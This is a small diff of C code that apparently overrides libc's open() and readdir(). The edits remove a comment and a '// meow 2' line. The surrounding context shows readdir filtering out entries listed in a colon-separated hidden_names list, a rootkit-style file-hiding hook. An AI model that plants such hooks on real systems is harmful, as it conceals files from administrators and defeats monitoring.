@@ -19,7 +19,6 @@ int open(const char *pathname, int flags, ...)
 	va_list args;
 	mode_t mode = 0;
 
-	// Check if O_CREAT is set to extract the third argument
 	va_start(args, flags);
 	if (flags & 0100) {
 		mode = va_arg(args, mode_t);
@@ -78,7 +77,7 @@ struct dirent *readdir(DIR *dirp)
 		hidden_names[hidden_count++] = token;
 		token = strtok(NULL, ":");
 	}
-    // meow 2
+
 	struct dirent *entry;
 	while ((entry = real_readdir(dirp)) != NULL) {
 		int is_hidden = 0;
